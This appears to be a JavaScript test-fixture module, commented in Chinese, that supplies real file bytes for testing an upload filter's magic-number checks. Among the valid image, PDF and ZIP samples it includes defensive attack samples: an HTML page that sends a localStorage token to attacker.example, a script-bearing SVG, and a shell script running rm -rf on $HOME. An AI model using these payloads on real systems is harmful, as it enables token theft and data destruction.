// 上传用例的样本文件：全部是**真实字节**，不是 mock。
// issue #22 是安全修复，服务端的判定只看 magic number，用假样本等于什么都没测。

/** 最小的合法 PNG（1×1 透明）。 */
export const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
  'base64',
);

/** 最小的合法 JPEG（1×1 白色，baseline）。 */
export const JPEG = Buffer.from(
  '/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a'
  + 'HBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAA'
  + 'AAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==',
  'base64',
);

/** 合法的 GIF89a（1×1）。 */
export const GIF = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');

/** 合法的 WebP（1×1，VP8L 无损）。 */
export const WEBP = Buffer.from(
  'UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==',
  'base64',
);

/** 攻击载荷：一份真的会读走 localStorage 里 token 的 HTML。 */
export const HTML = Buffer.from(
  '<!doctype html><html><body><script>'
  + "fetch('https://attacker.example/steal?t=' + localStorage.getItem('loop-im-token'));"
  + '</script></body></html>',
  'utf8',
);

/** 攻击载荷：带脚本的 SVG。当图片渲染也能跑。 */
export const SVG = Buffer.from(
  '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">'
  + '<script>alert(document.domain)</script></svg>',
  'utf8',
);

/** 普通文本、可执行脚本、真的 PDF、真的 ZIP —— 都是「非图片附件」这一档要收下的东西。 */
export const TEXT = Buffer.from('联调排期改到下周二，见附件。\n', 'utf8');
export const SHELL = Buffer.from('#!/bin/sh\nrm -rf "$HOME"\n', 'utf8');
export const PDF = Buffer.from(
  '%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n'
  + '2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n',
  'utf8',
);
/** 空 ZIP（"PK\x05\x06" 结尾记录），和 DOCX/XLSX 同一族的容器格式。 */
export const ZIP = Buffer.from('UEsFBgAAAAAAAAAAAAAAAAAAAAAAAA==', 'base64');

// ---- 指定字节数的**合法** PNG ----------------------------------------------
// 8MB 边界（issue #15）要拿真正能通过嗅探的图片去撞，随便 alloc 一片 0x01 已经不行了。
// 做法：在 IHDR 之后插一个 tEXt 辅助块当填充物，CRC 照规范算，产物是完整合法的 PNG。

const CRC_TABLE = (() => {
  const table = new Uint32Array(256);
  for (let n = 0; n < 256; n += 1) {
    let c = n;
    for (let k = 0; k < 8; k += 1) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    table[n] = c >>> 0;
  }
  return table;
})();

const crc32 = (buf) => {
  let c = 0xffffffff;
  for (const b of buf) c = CRC_TABLE[(c ^ b) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
};

const chunk = (type, data) => {
  const length = Buffer.alloc(4);
  length.writeUInt32BE(data.length);
  const body = Buffer.concat([Buffer.from(type, 'latin1'), data]);
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(body));
  return Buffer.concat([length, body, crc]);
};

/** PNG 签名 8 字节 + IHDR 块 25 字节（4 长度 + 4 类型 + 13 数据 + 4 CRC），位置是规范固定的。 */
const HEADER_BYTES = 33;
/** 一个块的固定开销：长度 4 + 类型 4 + CRC 4。 */
const CHUNK_OVERHEAD = 12;
const PAD_KEYWORD = Buffer.from('pad\0', 'latin1');

/** 造一张恰好 total 字节、能通过 magic number 嗅探的合法 PNG。 */
export function pngOfSize(total) {
  const padding = total - PNG.length - CHUNK_OVERHEAD - PAD_KEYWORD.length;
  if (padding < 0) throw new Error(`pngOfSize: 至少需要 ${PNG.length + CHUNK_OVERHEAD + PAD_KEYWORD.length} 字节`);
  const text = chunk('tEXt', Buffer.concat([PAD_KEYWORD, Buffer.alloc(padding, 0x61)]));
  return Buffer.concat([PNG.subarray(0, HEADER_BYTES), text, PNG.subarray(HEADER_BYTES)]);
}
